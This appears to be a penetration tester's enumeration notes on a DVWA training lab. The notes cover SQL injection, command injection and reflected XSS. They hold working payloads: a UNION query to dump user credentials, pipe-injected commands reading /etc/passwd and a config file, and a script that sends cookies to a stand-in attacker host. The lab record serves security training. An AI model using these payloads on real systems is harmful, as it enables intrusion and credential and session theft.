# Enumeration Findings — DVWA 10.10.30.129
## Date: 2026-03-13

## SQL Injection Module — /vulnerabilities/sqli/

### Injection Point
- Parameter: `id` (GET)
- Method: GET
- Injection type: Classic string-based (single-quote)

### Error Disclosure Confirmed
- Input: `1'`
- Response: `You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1`
- Database: MariaDB 10.1.26

### Column Enumeration (ORDER BY)
- ORDER BY 1: success (First name: admin, Surname: admin)
- ORDER BY 2: success
- ORDER BY 3: error ("Unknown column '3' in 'order clause'")
- Result: 2 columns, both outputting to page (col1 = First name, col2 = Surname)

### UNION-Based Extraction Confirmed
- Payload: `999' UNION SELECT database(),version()-- -`
- Result: First name = `dvwa`, Surname = `10.1.26-MariaDB-0+deb9u1`

### Database Structure Enumerated
Tables in `dvwa` schema:
- `guestbook`
- `users`

Columns in `users` table:
- user_id, first_name, last_name, user, password, avatar, last_login, failed_login

### Exploitation Payload Ready
Credential dump will use: `999' UNION SELECT user,password FROM users-- -`

---

## Command Injection Module — /vulnerabilities/exec/

### Injection Point
- Parameter: `ip` (POST)
- Method: POST
- Wrapper: PHP shell_exec() wrapping OS ping command

### Separators Tested
| Separator | Result | Notes |
|---|---|---|
| `;` | No injection — ping only returned | Semicolon may be filtered or shell behaves differently |
| `\|` (pipe) | INJECTION SUCCESSFUL | `127.0.0.1\|whoami` → `www-data` |
| `&&` (URL-encoded) | INJECTION SUCCESSFUL | `127.0.0.1&&whoami` → ping + `www-data` |

### Confirmed Execution Context
- OS user: `www-data`
- Pipe bypass confirms no sanitization on pipe character at security=low
- Command output returned inline in `<pre>` block

### Exploitation Payload Ready
- `ip=127.0.0.1|id` — confirm user context
- `ip=127.0.0.1|cat /etc/passwd` — system user enumeration
- `ip=127.0.0.1|cat /var/www/html/config/config.inc.php` — read live config

---

## XSS Reflected Module — /vulnerabilities/xss_r/

### Injection Point
- Parameter: `name` (GET)
- Method: GET
- Output context: Inside `<pre>Hello [input]</pre>` — raw HTML output, zero sanitization

### Payloads Tested
| Payload | URL-encoded | Result |
|---|---|---|
| `<script>alert(1)</script>` | `%3Cscript%3Ealert(1)%3C%2Fscript%3E` | REFLECTED UNESCAPED in response |

### Confirmed
- The `<script>` tag is returned verbatim in the HTML response
- Any victim loading the crafted URL would execute the JavaScript payload
- Session hijack via `document.cookie` to steal PHPSESSID (no HttpOnly) is viable

### Exploitation Payload Ready
- Cookie theft: `<script>document.location='http://attacker/steal?c='+document.cookie</script>`
- Alert PoC: `<script>alert(document.cookie)</script>`
